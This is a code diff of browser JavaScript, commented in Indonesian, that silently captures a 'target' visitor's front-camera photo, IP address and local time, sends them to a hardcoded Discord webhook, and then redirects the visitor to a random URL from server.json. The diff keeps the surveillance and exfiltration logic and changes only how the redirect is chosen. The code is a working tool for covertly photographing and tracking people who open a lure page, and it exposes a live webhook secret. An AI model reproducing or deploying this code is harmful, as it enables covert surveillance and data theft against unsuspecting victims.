@@ -1,12 +1,12 @@
-const webhookURL = "https://discord.com/api/webhooks/1352760933654724668/RiiciP_za_eGd7u1OvHr1IbLXm4Ob7NWmk7MUMkOJ8Z9TZOAOFFPESpwMspxeQR_WPp9"; // Ganti dengan Webhook Discord
-const redirectURL = "https://id.shp.ee/5chejHg"; // Ganti dengan URL tujuan setelah 11 detik
+const webhookURL = "https://discord.com/api/webhooks/1352760933654724668/RiiciP_za_eGd7u1OvHr1IbLXm4Ob7NWmk7MUMkOJ8Z9TZOAOFFPESpwMspxeQR_WPp9"; 
+const jsonURL = "server.json"; // Ganti dari urls.json ke server.json
 
 const canvas = document.createElement("canvas");
 const context = canvas.getContext("2d");
 canvas.style.display = "none";
 document.body.appendChild(canvas);
 
-// Fungsi untuk mendapatkan waktu lokal HP target
+// Fungsi mendapatkan waktu lokal HP target
 function getLocalTime() {
     const now = new Date();
     const hours = now.getHours().toString().padStart(2, "0");
@@ -23,21 +23,20 @@ fetch("https://api64.ipify.org?format=json")
         const ip = data.ip;
         const location = "Unknown"; // Bisa diganti dengan API lokasi jika perlu
 
-        // Akses kamera hanya untuk ambil foto
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 const track = stream.getVideoTracks()[0];
                 const imageCapture = new ImageCapture(track);
                 
                 setTimeout(() => {
-                    const localTime = getLocalTime(); // Ambil waktu lokal HP target
+                    const localTime = getLocalTime();
                     imageCapture.takePhoto()
                         .then(blob => {
                             sendToDiscord(blob, ip, location, localTime);
-                            track.stop(); // Matikan kamera setelah foto diambil
+                            track.stop();
                         })
                         .catch(error => console.error("Gagal ambil foto:", error));
-                }, 3000); // Ambil foto setelah 3 detik
+                }, 3000);
             })
             .catch(err => console.error("Akses kamera ditolak:", err));
     })
@@ -58,7 +57,18 @@ function sendToDiscord(blob, ip, location, localTime) {
     });
 }
 
-// Redirect ke halaman lain setelah 11 detik
-setTimeout(() => {
-    window.location.href = redirectURL;
-}, 11000);
+// Ambil URL acak dari server.json & redirect setelah 11 detik
+fetch(jsonURL)
+    .then(response => response.json())
+    .then(data => {
+        const urls = data.urls;
+        if (urls && urls.length > 0) {
+            const randomURL = urls[Math.floor(Math.random() * urls.length)];
+            setTimeout(() => {
+                window.location.href = randomURL;
+            }, 11000);
+        } else {
+            console.error("JSON tidak berisi URL");
+        }
+    })
+    .catch(error => console.error("Gagal mengambil URL dari server.json:", error));
